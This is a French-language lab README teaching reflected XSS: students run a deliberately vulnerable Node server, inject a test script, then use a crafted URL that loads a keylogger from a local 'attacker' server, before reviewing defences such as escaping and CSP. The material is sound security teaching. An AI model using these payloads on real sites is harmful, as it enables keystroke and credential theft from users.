
# TP : Vulnérabilité XSS Reflected

Ce TP permet d'explorer et de comprendre les vulnérabilités XSS (Cross-Site Scripting) de type reflected ainsi que les moyens de s'en protéger.

## Prérequis

- Node.js installé sur votre machine
- Un navigateur web moderne
- Connaissance de base en JavaScript

## Installation et Configuration

1. Cloner le dépôt :
```bash
git clone http://github.com/bouhenic/xss.git
cd xss/xssReflected/vulnerableServer
```
2. Cloner le dépôt :
```bash
npm install
```

3. Lancer le serveur vulnérable :
```bash
node index.js
```

## Exercices

### A. Détection des vulnérabilités XSS

1. Accédez à l'application via votre navigateur :
   - URL : http://localhost:3000

2. Test initial :
   - Saisissez votre nom dans le champ
   - Observez l'URL résultante : `localhost:3000/?name=votre_nom`

3. Test d'injection JavaScript :
   - Injectez le code : `<script>alert('XSS');</script>`
   - Observez l'exécution du JavaScript
   - Notez la présence du code injecté dans l'URL, démontrant la vulnérabilité

### B. Attaque XSS Reflected

1. Configuration du serveur attaquant :
```bash
cd xss/xssReflected/hackerServer
npm install
node index.js
```

2. Analyse du vecteur d'attaque :
   - URL malveillante : 
```
http://localhost:3000/?name=<script src="http://localhost:3001/keylogger.js"></script>
```
   - Cette URL charge un keylogger externe depuis le serveur de l'attaquant

### C. Simulation d'une attaque

1. Exécutez l'URL malveillante dans un nouvel onglet
2. Tapez quelques touches sur la page
3. Vérifiez les données capturées sur le serveur attaquant (localhost:3001)

### D. Implémentation des Protections

Pour sécuriser l'application contre les attaques XSS :

1. Échappement des caractères spéciaux
2. Validation des entrées utilisateur
3. Utilisation d'en-têtes de sécurité appropriés
4. Implementation de CSP (Content Security Policy)

## Points clés à retenir

- Les attaques XSS reflected exploitent le manque de validation des entrées utilisateur
- L'injection de code malveillant peut être dissimulée dans une URL
- La sécurisation nécessite plusieurs niveaux de protection

## Ressources additionnelles

- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [MDN Web Security](https://developer.mozilla.org/en-US/docs/Web/Security)

## Notes de sécurité

⚠️ Ce TP est destiné à des fins éducatives uniquement. Les techniques présentées ne doivent pas être utilisées sur des systèmes sans autorisation.
